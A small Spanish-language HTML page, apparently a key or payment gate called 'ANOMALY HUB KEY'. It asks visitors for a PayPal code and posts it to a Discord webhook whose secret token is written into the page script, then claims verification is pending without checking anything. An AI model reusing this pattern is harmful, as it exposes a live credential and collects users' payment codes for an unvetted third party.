<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ANOMALY HUB KEY</title>
<style>
*{box-sizing:border-box}
body{
  margin:0;
  min-height:100vh;
  background:#081a3a;
  color:#fff;
  font-family:Arial,Helvetica,sans-serif;
  display:flex;
  align-items:center;
  justify-content:center;
}
.box{
  width:95%;
  max-width:420px;
  background:#0b255a;
  padding:24px;
  border-radius:10px;
  text-align:center;
}
h1{margin:0 0 16px}
input,button{
  width:100%;
  padding:14px;
  margin:8px 0;
  border-radius:6px;
  border:none;
  font-size:16px;
}
button{
  background:#1e88ff;
  color:#fff;
}
#msg{margin-top:10px}
</style>
</head>
<body>
  <div class="box">
    <h1>ANOMALY HUB KEY</h1>
    <p>Ingresa tu código de pago</p>
    <input id="code" placeholder="Código PayPal">
    <button onclick="send()">VERIFY</button>
    <div id="msg"></div>
  </div>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1447268606726639867/rbLol3db3UPeu2FnwLqWGFqbDl3jpI4IyChajEKLfhbjTy4Ml_328XKaous2UAl9WfyZ";

function send(){
  const c = document.getElementById("code").value || "SIN CÓDIGO";
  document.getElementById("msg").innerText = "Enviado. Espera verificación.";

  try{
    fetch(WEBHOOK,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({
        content:`💳 NUEVA SOLICITUD\nCódigo: ${c}`
      })
    }).catch(()=>{});
  }catch(e){}
}
</script>
</body>
</html>
